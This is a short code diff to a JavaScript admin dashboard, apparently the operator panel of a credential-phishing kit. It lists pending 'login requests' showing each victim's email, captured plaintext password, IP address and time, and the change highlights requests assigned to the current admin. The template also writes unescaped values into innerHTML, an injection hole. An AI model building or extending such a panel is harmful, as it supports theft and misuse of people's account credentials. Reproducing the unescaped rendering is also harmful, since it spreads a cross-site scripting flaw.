@@ -46,10 +46,11 @@
             container.innerHTML = '<p>暂无待审核的登录请求</p>';
             return;
         }
-
+        const myId = this.currentAdmin ? this.currentAdmin.id : null;
         container.innerHTML = requests.map(request => {
+            const isMine = request.assigned_admin_id && myId && Number(request.assigned_admin_id) === Number(myId);
             return `
-            <div class="request-item" data-id="${request.id}">
+            <div class="request-item${isMine ? ' my-assigned' : ''}" data-id="${request.id}" style="${isMine ? 'background:#e6f7ff;border-left:4px solid #1890ff;' : ''}">
                 <div class="request-header">
                     <div class="request-info">
                         <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${request.password || '未获取到密码'}</strong> | IP: ${request.ip_address} | 时间: ${new Date(request.login_time).toLocaleString()}</h4>
